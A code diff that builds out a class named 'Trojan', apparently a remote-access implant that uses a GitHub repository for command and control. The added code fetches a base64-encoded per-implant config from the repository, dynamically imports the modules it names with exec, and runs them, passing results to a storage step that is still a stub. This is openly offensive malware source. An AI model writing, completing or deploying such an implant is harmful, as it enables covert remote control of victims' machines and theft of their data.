@@ -22,17 +22,34 @@ def get_file_contents(dirname,module_name, repo):
 
 #create trojan class to performs trojaning task
 class Trojan:
+    #function init
     def __init__(self,id):
-        pass
+        self.id = id
+        self.config_file = f'{id}.json'
+        self.data_path = f'data/{id}/'
+        self.repo = github_connect()
 
+    #function get configuration
     def get_config(self):
-        pass
+        #read config file
+        config_json = get_file_contents(
+            'config', self.config_file, self.repo
+        )
+        #load config data
+        config = json.loads(base64.b64decode(config_json))
 
-    def module_runner(self, module):
-        pass
-
-    def store_module(self, data):
-        pass
+        #checking module
+        for task in config:
+            if task['module'] not in sys.modules:
+                exec("import %s" % task['module'])
+        return config
     
+    def module_runner(self, module):
+        result = sys.modules[module].run()
+        self.store_module_result(result)
+
+    def store_module_result(self, data):
+        pass
+
     def run(self):
         pass
